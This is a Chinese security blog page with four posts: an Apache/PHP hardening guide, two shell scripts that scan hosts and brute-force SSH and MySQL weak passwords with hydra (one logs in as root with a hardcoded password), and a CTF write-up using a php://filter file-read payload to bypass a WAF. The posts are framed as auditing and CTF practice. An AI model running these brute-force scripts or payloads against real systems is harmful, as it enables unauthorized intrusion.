<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="信息安全技术博客">
<meta property="og:type" content="website">
<meta property="og:title" content="Lawliet Blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Lawliet Blog">
<meta property="og:description" content="信息安全技术博客">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Lawliet Blog">
<meta name="twitter:description" content="信息安全技术博客">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>Lawliet Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Lawliet Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">原创文章，未经授权请勿转载</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/19/apache_security_config/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/05/19/apache_security_config/" itemprop="url">Apache安全加固</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-19T23:38:59+08:00">
                2018-05-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全加固/" itemprop="url" rel="index">
                    <span itemprop="name">安全加固</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Apache安全加固"><a href="#Apache安全加固" class="headerlink" title="Apache安全加固"></a>Apache安全加固</h1><p><strong>这篇文章记录了针对apache几种安全问题所进行的安全加固手段，环境为Centos</strong></p>
<h2 id="服务器banner信息隐藏"><a href="#服务器banner信息隐藏" class="headerlink" title="服务器banner信息隐藏"></a>服务器banner信息隐藏</h2><h3 id="404页面以及http响应头信息泄露"><a href="#404页面以及http响应头信息泄露" class="headerlink" title="404页面以及http响应头信息泄露"></a>404页面以及http响应头信息泄露</h3><p><strong>如果对服务器一个不存在的资源进行访问，网站返回的404页面将会泄露apache版本，服务器操作系统类型等信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180519/90D016lEic.png?imageslim" alt="mark"><br><strong>可以看到404错误页面显示了apache的版本、服务器的操作系统类型、ip和端口</strong></p>
<p><strong>还有就是在http的响应头中，也会泄露有关服务器的一些信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/E6ibcfJ04E.png?imageslim" alt="mark"><br><strong>http响应头的Server中泄露了apache的版本和服务器操作系统类型</strong></p>
<p><strong>加固方案：需要修改apache配置文件的两个地方，配置文件位置：<code>/etc/httpd/conf/httpd.conf</code>,将对应的参数修改成下面的值</strong></p>
<pre><code>ServerTokens Prod
ServerSignature Off
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/5DDcBfL29g.png?imageslim" alt="mark"></p>
<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/k9j741e1cA.png?imageslim" alt="mark"><br><strong>修改完后重启服务,就可以修复了，可以看到这些信息不再出现</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/L4F39GedbG.png?imageslim" alt="mark"></p>
<h3 id="http响应头泄露php版本信息"><a href="#http响应头泄露php版本信息" class="headerlink" title="http响应头泄露php版本信息"></a>http响应头泄露php版本信息</h3><p><strong>http响应头中的X-Powered-By泄露了php版本信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/i1JI409h8c.png?imageslim" alt="mark"><br><strong>加固方案：修改php配置文件，配置文件位置：<code>/etc/php.ini</code>，修改参数</strong></p>
<pre><code>expose_php=Off
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/eHK8lHCE4k.png?imageslim" alt="mark"><br><strong>修改完成后，重启apache服务，php版本信息不再显示</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/D8gfh8iBCi.png?imageslim" alt="mark"></p>
<h2 id="修改apache默认主页"><a href="#修改apache默认主页" class="headerlink" title="修改apache默认主页"></a>修改apache默认主页</h2><h3 id="apache默认主页信息泄露"><a href="#apache默认主页信息泄露" class="headerlink" title="apache默认主页信息泄露"></a>apache默认主页信息泄露</h3><p><strong>当apache安装完成后，apache的默认主页会泄露服务器的一些信息</strong></p>
<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/BcDmc95fcG.png?imageslim" alt="mark"><br><strong>可以看到apache默认页面泄露了网站的根目录和某配置文件</strong></p>
<p><strong>加固方案：修改apache配置文件中的DirectoryIndex，并在网站根目录自定义index.html或者index.php</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/4LkC4jeEBG.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/cEK1GFb0fJ.png?imageslim" alt="mark"><br><strong>修改完成后不再显示默认页</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/Fb38bd4llF.png?imageslim" alt="mark"></p>
<h2 id="自定义404页面"><a href="#自定义404页面" class="headerlink" title="自定义404页面"></a>自定义404页面</h2><p><strong>为了安全考虑和与网站用户的友好交互，自定义404页面也是件必要的事情</strong></p>
<p><strong>加固方法：在网上寻找404页面模板上传至服务器网站根目录，修改apache配置文件，找到<code>ErrorDocument 404</code>,将自定义的404页面路径添加上去</strong></p>
<pre><code>ErrorDocument 404 /404page/index.html
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/DfhJ1f3laC.png?imageslim" alt="mark"><br><strong>同时修改404的html文件，修改css，js文件的加载路径，不然css和js会因为请求不到资源而加载失败</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/AhLkBAekKD.png?imageslim" alt="mark"></p>
<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/EIgCFDal5A.png?imageslim" alt="mark"><br><strong>重启apache服务</strong></p>
<p><strong>修改前的404页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/9ECKkDDEbh.png?imageslim" alt="mark"><br><strong>修改后的404页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/m70eLc5Fc3.png?imageslim" alt="mark"></p>
<h2 id="防止列目录泄露敏感信息"><a href="#防止列目录泄露敏感信息" class="headerlink" title="防止列目录泄露敏感信息"></a>防止列目录泄露敏感信息</h2><p><strong>网站允许列目录是个很严重的安全问题，有时由于列目录可能会导致一些配置文件或者一些重要敏感信息泄露</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/l3hi9EH7d6.png?imageslim" alt="mark"><br><strong>加固方案：其中一种加固方案就是在每个目录下都设置一个默认页（index.html或者index.php），这样可以防止列目录，但是会比较麻烦.另外一种方式就是修改apache的配置文件，将网站根目录<code>/var/www/html</code>下的<code>Options Indexes FollowSymLinks</code>改为<code>Options FollowSymLinks</code>,将indexes参数去掉</strong></p>
<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/LeG2c9gJGG.png?imageslim" alt="mark"><br><strong>修改完成后重启服务，再次访问目录就会出现403禁止访问的页面，但是目录下的页面还是可以照常访问，只是禁止了列目录的操作</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/kJfeFbbH70.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/kk09aFAaeg.png?imageslim" alt="mark"></p>
<h2 id="禁用php危险函数"><a href="#禁用php危险函数" class="headerlink" title="禁用php危险函数"></a>禁用php危险函数</h2><p><strong>php有些函数如果开启的话，当黑客拿下一个webshell就会利用函数取执行一些危险命令，所以可以把一些危险函数禁用掉，以phpinfo为例，修改php配置文件<code>/etc/php.ini</code>,查找<code>disable_funcions</code>，配置</strong></p>
<pre><code>disable_funcions=phpinfo
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/0Cd68AI7hC.png?imageslim" alt="mark"><br><strong>修改前</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/c06CGjEle1.png?imageslim" alt="mark"><br><strong>修改后</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/B227gA44Em.png?imageslim" alt="mark"></p>
<h2 id="指定目录禁止php解析"><a href="#指定目录禁止php解析" class="headerlink" title="指定目录禁止php解析"></a>指定目录禁止php解析</h2><p><strong>通常，向一些上传图片的目录，如果代码层对文件上传没有做好限制，导致黑客上传php代码getshell，所以对指定目录禁止php解析是很有必要的</strong></p>
<p><strong>比如网站上传目录被上传了一个webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/CJ1KJe707J.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/43F7LhCH5J.png?imageslim" alt="mark"><br><strong>可以连接webshell，这是很严重的</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/0DmGmab529.png?imageslim" alt="mark"></p>
<p><strong>加固方案，修改apache配置文件，设置指定目录没有执行php的权限，在配置文件中添加</strong></p>
<pre><code>&lt;Directory &quot;/var/www/html/uploads&quot;&gt;
    php_flag engine off
&lt;/Directory&gt;
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/3E7LaFlicG.png?imageslim" alt="mark"><br><strong>重启服务，可以看到由于uploads目录下禁止解析php脚本了，所以此时webshell就不能连接了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/G2IGhHemdG.png?imageslim" alt="mark"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/17/autocheck/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/05/17/autocheck/" itemprop="url">用shell实现对指定ip进行自动基线安全检查</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-17T23:14:50+08:00">
                2018-05-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux-Shell/" itemprop="url" rel="index">
                    <span itemprop="name">Linux Shell</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="用shell脚本实现对指定ip进行自动基线安全检查"><a href="#用shell脚本实现对指定ip进行自动基线安全检查" class="headerlink" title="用shell脚本实现对指定ip进行自动基线安全检查"></a>用shell脚本实现对指定ip进行自动基线安全检查</h1><p><strong>最近在学习shell脚本，一直再尝试用shell实现一些有意思的东西，该脚本实现了自动上传基线脚本到指定linux服务器上运行检查，并且将检查结果文件发送到我们的机器</strong></p>
<p><strong>scp.exp:发送基线脚本到指定ip的服务器</strong></p>
<pre><code>#!/usr/bin/expect -f
set timeout 10
set host [lindex $argv 0]
set username [lindex $argv 1]
set password [lindex $argv 2]
set src_file [lindex $argv 3]
set dest_file [lindex $argv 4]

spawn scp -r $src_file $username@$host:/tmp/$dest_file
expect {
     &quot;(yes/no)?&quot; {
             send &quot;yes\n&quot;
             expect &quot;*assword:&quot; { send &quot;$password\n&quot; }
     }
     &quot;*assword:&quot; {
             send &quot;$password\n&quot;
     }
}


expect &quot;100%&quot;
expect eof:
</code></pre><p><strong>excute.exp：ssh登陆指定ip执行之前上传的基线脚本，并且将运行结果的文件发送回来</strong></p>
<pre><code>#!/usr/bin/expect -f 
set ip [lindex $argv 0 ]
set password [lindex $argv 1 ]
set timeout 10
spawn ssh root@$ip 
expect { 
&quot;*yes/no&quot; { send &quot;yes\r&quot;; exp_continue}
&quot;*password:&quot; { send &quot;$password\r&quot; }
}
expect {
&quot;#*&quot;  { send &quot;pwd\r cd /tmp/\r ./66c221be-6ab2-ef53-1589-fe16877914f4.sh $ip\r&quot; }
}
spawn scp root@$ip:/tmp/192.168.3.3_66c221be-6ab2-ef53-1589-fe16877914f4_chk.xml /root/autocheck/report/192.168.3.3_66c221be-6ab2-ef53-1589-fe16877914f4_chk.xml
expect {
     &quot;(yes/no)?&quot; {
             send &quot;yes\n&quot;
             expect &quot;*assword:&quot; { send &quot;$password\n&quot; }
     }
     &quot;*assword:&quot; {
             send &quot;$password\n&quot;
     }
} 
expect eof
exit
</code></pre><p><strong>ip.list：存放需要检查的ip列表</strong></p>
<p><strong>autocheck.sh：读取ip列表，检查存活的主机，过滤出开放22端口的主机ip，调用之前写的两个脚本去自动传送基线检查脚本执行并且将结果返回回来</strong></p>
<pre><code>#!/bin/bash
for ip in `cat ip.list`
do
newip=`nmap -Pn -sS -p 22 $ip|grep &quot;open&quot; -B4|awk &apos;/Nmap scan/{print $5}&apos;`
hydra -l root -p 123456 $newip ssh|grep &quot;password:&quot;
if [ $? == 0 ]
then
./scp.exp $newip &quot;root&quot; &quot;123456&quot; &quot;/root/autocheck/linux_check/66c221be-6ab2-ef53-1589-fe16877914f4.sh&quot; &quot;66c221be-6ab2-ef53-1589-fe16877914f4.sh&quot;
./scp.exp $newip &quot;root&quot; &quot;123456&quot; &quot;/root/autocheck/linux_check/66c221be-6ab2-ef53-1589-fe16877914f4.pl&quot; &quot;66c221be-6ab2-ef53-1589-fe16877914f4.pl&quot;
./excute.exp $newip &quot;123456&quot;
else
continue
fi
done
</code></pre><p><strong>执行./autocheck.sh后的结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180517/9DhgKGAfg5.png?imageslim" alt="mark"><br><strong>可以看到report目录下就是返回来的文件，里面存放着linux基线扫描的结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180517/HaAkCfiD57.png?imageslim" alt="mark"></p>
<p><strong>还可以改进的地方，这个脚本用户名密码写死了，可以再加一个用户名密码文件，读取用户名密码登录，然后检查，这样会更有实际意义，自己会不断完善功能，希望在以后的实习中可以直接用到。</strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/14/autobrute/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/05/14/autobrute/" itemprop="url">用shell实现自动化扫描主机端口爆破服务弱口令</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-14T16:36:34+08:00">
                2018-05-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux-Shell/" itemprop="url" rel="index">
                    <span itemprop="name">Linux Shell</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="用shell实现自动化扫描主机端口爆破服务弱口令"><a href="#用shell实现自动化扫描主机端口爆破服务弱口令" class="headerlink" title="用shell实现自动化扫描主机端口爆破服务弱口令"></a>用shell实现自动化扫描主机端口爆破服务弱口令</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间</strong></p>
<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p><strong>假设现在有一个需求，公司分配给你了一个ip列表，要求你将其中存活的主机筛选出来，检查这些主机是否开启了常用的服务，以及是否存在弱口令</strong></p>
<p><strong>一般常用的做法就是先利用nmap扫描出存活主机，然后扫描这些主机开放的端口，用hydra对这些端口进行弱口令安全检查。如果将这些命令写在一个shell脚本中，以后再次做相同的工作时直接运行我们编写的.sh文件就可以了，这样的话就能大大提高我们的工作效率，避免重复机械的工作，大大提升效率</strong></p>
<h3 id="编写shell脚本"><a href="#编写shell脚本" class="headerlink" title="编写shell脚本"></a>编写shell脚本</h3><p><strong>我编写的shell脚本有以下几部分组成</strong></p>
<p><strong>ip.txt</strong></p>
<pre><code>ip列表，里面放着要扫描的ip
</code></pre><p><strong>service.conf</strong></p>
<pre><code>配置文件，里面是我们要检查的服务和其对应的端口号，使用者可以在这里进行设置要检查的服务
</code></pre><p><strong>比如要检查ssh与mysql服务的弱口令，里面这样写，配置文件格式：<code>端口：服务</code></strong></p>
<pre><code>22:ssh
3306:mysql
</code></pre><p><strong>这样便能灵活的对我们需要的服务进行弱口令检测</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/HKF6Jl6Jdl.png?imageslim" alt="mark"></p>
<p><strong>user.txt</strong></p>
<pre><code>存放着常见的用户名，用于hydra爆破
</code></pre><p><strong>passwd.txt</strong></p>
<pre><code>存放着常见的弱口令，用于hydra爆破
</code></pre><p><strong>brute.sh</strong></p>
<pre><code>下面的就是我编写的shell脚本，可以自动化的完成上述的一系列工作

#!/bin/bash
filename=$1
for port in `awk -F &apos;:&apos; &apos;{print $1}&apos; service.conf`
do
name=`awk -F &apos;:&apos; &apos;/&apos;$port&apos;/{print $2}&apos; service.conf`
echo &quot;$name weak password result:&quot;
nmap -sn -iL $filename|awk &apos;/Nmap scan/{print $5}&apos;&gt;liveip.txt
nmap -Pn -sS -p $port -iL liveip.txt|grep &quot;open&quot; -B &quot;5&quot;|awk &apos;/Nmap scan/{print $5}&apos;&gt;tmpip.txt
if [ ! -s tmpip.txt ]
then
echo &quot;no ip open port $port&quot;
else
result=`hydra -L user.txt -P passwd.txt -M tmpip.txt $name -t 4|awk &apos;/password:/{print $0}&apos;`
echo $result
fi
done
</code></pre><p><strong>首先接收命令行的第一个参数，也就是要进行检查的ip列表文件ip.txt，之后循环读取服务配置文件，使用awk工具筛选出要检查的端口号和其对应的服务并赋值给对应的变量，之后用nmap进行主机存活扫描，将存活主机使用awk匹配出来输出到一个文件中，使用nmap对这个文件里的这些存活ip进行端口扫描，利用awk将nmap扫描结果中开放端口的ip筛选出来输出到一个文件里，之后利用hydra对这些ip进行其端口对应服务的弱口令检查</strong></p>
<p><strong>脚本运行结果，以自己所在内网的ip作为测试，ip段<code>192.168.3.0/24</code>,可以看出针对ssh服务还是检查出很多弱口令的，mysql服务大多数都禁止了远程连接，所以没有扫出弱口令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/Ca7L5i0dGI.png?imageslim" alt="mark"></p>
<p><strong>这是初步编写的成果，只是与文件进行交互，而且有着很多的不足，之后随着学习的深入，相信会写出比这个更棒更完善的脚本</strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/13/parse_url/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/05/13/parse_url/" itemprop="url">php parse_url()函数的漏洞</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-13T18:11:57+08:00">
                2018-05-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index">
                    <span itemprop="name">ctf</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="php-parse-url-函数的漏洞"><a href="#php-parse-url-函数的漏洞" class="headerlink" title="php parse_url()函数的漏洞"></a>php parse_url()函数的漏洞</h1><p><strong>在ctf比赛中经常遇到的一个知识点，记录一下，由于parse_url函数在解析url时存在的bug导致在某些情况下可以绕过正则的过滤</strong></p>
<p><strong>来看代码</strong></p>
<pre><code>&lt;?php
$url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]);
parse_str($url[&apos;query&apos;],$query);
var_dump($query); 
?&gt;
</code></pre><p><strong>访问url：<a href="http://127.0.0.1/info/parseurl.php?sql=select" target="_blank" rel="external">http://127.0.0.1/info/parseurl.php?sql=select</a></strong></p>
<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/acDbC5lEe8.png?imageslim" alt="mark"><br><strong>这里会是url中正常的参数值</strong></p>
<p><strong>如果访问url:<a href="http://127.0.0.1///info/parseurl.php?sql=select" target="_blank" rel="external">http://127.0.0.1///info/parseurl.php?sql=select</a></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/EbCH4hKH9b.png?imageslim" alt="mark"><br><strong>这时将不能正常返回url中的参数值，遇到这样格式的连接，parse_url函数将会返回False，这种情况下可能会绕过某些waf的过滤</strong></p>
<p><strong>来看一道ctf题</strong></p>
<pre><code>http://118.126.113.78/web1/?id=1
</code></pre><p><strong>已经确定id参数存在过滤，fuzz了一下，大概过滤了and,select,union,from等sql关键字，导致union注入和报错注入都失败，根据页面源代码的提示我们可以利用php伪协议读取出页面源代码看看它究竟是怎么样过滤的</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/0I4Bkl3ibm.png?imageslim" alt="mark"><br><strong>利用php伪协议文件包含读取waf.php的源代码</strong>    </p>
<pre><code>http://118.126.113.78/web1/?file=php://filter/convert.base64-encode/resource=waf.php
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/fgjlla414b.png?imageslim" alt="mark"></p>
<pre><code>PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRfR0VUPUFkZF9TKCRfR0VUKTsNCiRfUE9TVD1BZGRfUygkX1BPU1QpOw0KJF9DT09LSUU9QWRkX1MoJF9DT09LSUUpOw0KJF9SRVFVRVNUPUFkZF9TKCRfUkVRVUVTVCk7DQpmdW5jdGlvbiBBZGRfUygkYXJyYXkpDQp7DQpmb3JlYWNoKCRhcnJheSBhcyAka2V5PT4kdmFsdWUpew0KICAgICAgICAgICAgICAgIGlmKCFpc19hcnJheSgkdmFsdWUpKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICRjaGVjaz0gcHJlZ19tYXRjaCgnL3JlZ2V4cHxhbmR8bGlrZXxcInwlfGluc2VydHx1cGRhdGV8ZGVsZXRlfHVuaW9ufGludG98bG9hZF9maWxlfG91dGZpbGV8XC9cKi9pJywgJHZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRjaGVjaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJIYWNrZXIhIik7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfWVsc2V7DQogICAgICAgICAgICAgICAgICAgICAgICAkYXJyYXlbJGtleV09QWRkX1MoJGFycmF5WyRrZXldKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgIH0NCnJldHVybiAkYXJyYXk7DQp9DQoNCmZ1bmN0aW9uIE1lYXN1cmVtZW50X3VybCgpDQp7DQogICAgJHVybD1wYXJzZV91cmwoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pOw0KICAgIHBhcnNlX3N0cigkdXJsWydxdWVyeSddLCRxdWVyeSk7DQogICAgJ